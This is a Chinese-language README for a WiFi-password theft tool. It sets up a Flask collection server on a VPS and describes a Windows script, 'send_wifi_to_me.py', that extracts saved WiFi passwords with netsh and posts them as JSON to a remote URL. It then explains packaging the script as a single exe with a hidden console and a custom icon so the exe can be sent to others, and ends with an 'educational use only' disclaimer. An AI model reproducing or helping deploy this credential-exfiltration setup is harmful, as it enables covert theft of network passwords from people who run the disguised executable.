# 数据收集 VPS 设置指南

本指南将帮助你在一台新的 Linux VPS 上设置一个基于 Flask 的服务，用于通过 HTTP POST 请求接收 WiFi 配置文件数据。

## 前提条件

- 拥有一台 Linux VPS，并具有 root 权限。
- 具备基本的 SSH 和命令行操作知识。

## 设置步骤

### 步骤 1：将脚本上传到 VPS

首先，将 `linux_setup_vps.sh` 脚本保存到本地机器上，然后使用 `scp` 或其他文件传输方法将其上传到你的 VPS。

```bash
scp linux_setup_vps.sh your_username@your_vps_ip:/path/to/destination
```

### 步骤 2：赋予脚本执行权限

在 VPS 上，使用以下命令为脚本赋予

```
chmod +x linux_setup_vps.sh
```

### 步骤 3：运行脚本

使用以下命令在 VPS 上运行脚本：

```
sudo ./linux_setup_vps.sh
```

### 步骤 4：验证服务

脚本运行完成后，Flask 应用将会在端口 80 上启动并监听来自客户端的 POST 请求。接收的数据将被保存到 `/opt/flask_app/received_data.txt` 文件中。

你可以使用以下命令查看服务状态：

```
systemctl status flask_app.service
```

## 脚本说明

`linux_setup_vps.sh` 脚本会执行以下操作：

1. **系统更新**：更新系统包，确保系统处于最新状态。
2. **安装 Python 3 和 pip3**：安装 Python 3 和 `pip3`，为 Flask 框架提供运行环境。
3. **安装 Flask**：通过 `pip` 安装 Flask 框架。
4. **创建 Flask 应用**：创建一个 Flask 应用，监听 HTTP POST 请求并保存接收到的 WiFi 数据。
5. **配置系统服务**：将 Flask 应用配置为系统服务，设置为开机自启并在后台运行。

## 注意事项

- 如果你希望通过 HTTPS 传输数据，需进一步配置 SSL 证书。
- 你可以根据需求修改 Flask 应用，以增加例如身份验证等安全措施。

setup_vps.sh是我在Windows上写的，直接复制到Linux上发生了错误。建议直接使用linux_setup_vps.sh

# 发送设置

## 概述

`send_wifi_to_me.py` 是一个 Python 脚本，用于获取 Windows 系统中保存的无线网络密码，并将这些密码发送到指定的服务器。脚本包括以下功能：

1. 获取系统中的所有无线网络配置文件。
2. 提取每个无线网络的密码。
3. 将密码信息保存到本地文件。
4. 将密码信息发送到指定的服务器。

## 功能

1. **获取无线网络配置文件**：使用 `netsh` 命令获取所有保存的无线网络配置文件。
2. **获取无线网络密码**：根据配置文件名称获取对应的无线网络密码。
3. **保存密码到文件**：将每个无线网络的名称和密码保存到本地文本文件中。
4. **发送数据到服务器**：将无线网络名称和密码信息以 JSON 格式发送到指定的服务器。

## 使用方法

1. **准备工作**：

   - 确保安装了 `requests` 库：

     ```
     bash
     复制代码
     pip install requests
     ```

2. **配置服务器 URL**：

   - 在脚本中找到以下行，并将其替换为你的 VPS 接收数据的 URL：

     ```
     python
     复制代码
     url = "http://1.2.3.4/receive_wifi_data"
     ```

3. **运行脚本**：

   - 在 Windows 上以管理员身份运行脚本，以确保能够执行 `netsh` 命令并获取无线网络密码：

     ```
     bash
     复制代码
     python send_wifi_to_me.py
     ```

4. **查看结果**：

   - 脚本将密码信息保存到 `1.txt` 文件中，并将文件中的数据发送到指定的服务器。
   - 脚本运行结束后，控制台会显示操作结果信息。

5. **可以打包成exe发送**

   ### 步骤 1：安装 PyInstaller

   首先，你需要在你的 Python 环境中安装 `PyInstaller`。

   ```
   pip install pyinstaller
   ```

   ### 步骤 2：使用 PyInstaller 打包脚本

   在终端或命令提示符中，导航到 `send_wifi_to_me.py` 所在的目录，然后运行以下命令：

   ```
   pyinstaller --onefile send_wifi_to_me.py
   ```

   `--onefile` 选项会将所有依赖打包到一个单独的 `.exe` 文件中。

   ### 步骤 3：找到生成的 .exe 文件

   打包完成后，生成的 `.exe` 文件会保存在 `dist` 目录中。你可以在该目录下找到 `send_wifi_to_me.exe`。

   ### 其他注意事项

   - **外部文件**：如果脚本依赖于外部文件或配置文件，请确保这些文件在打包后也可以正确访问。

   - **隐藏控制台**：如果你不希望在运行 `.exe` 文件时弹出命令行窗口，可以使用 `--noconsole` 选项：

     ```
     pyinstaller --onefile --noconsole send_wifi_to_me.py
     ```

   - **图标**：你也可以使用 `--icon` 选项为你的 `.exe` 文件添加图标：

     ```
     pyinstaller --onefile --icon=your_icon.ico send_wifi_to_me.py
     ```


## 注意事项

- **管理员权限**：脚本需要管理员权限来执行 `netsh` 命令以获取无线网络密码。
- **服务器配置**：确保服务器上的接收端能够处理接收到的 JSON 数据。
- **安全性**：处理和存储无线网络密码时，请确保采取适当的安全措施。

## 版权和免责声明

- **脚本创建者**：iknow
- **免责声明**：本脚本仅用于教育目的，确保在合法和道德的范围内使用。请遵守当地法律和隐私政策。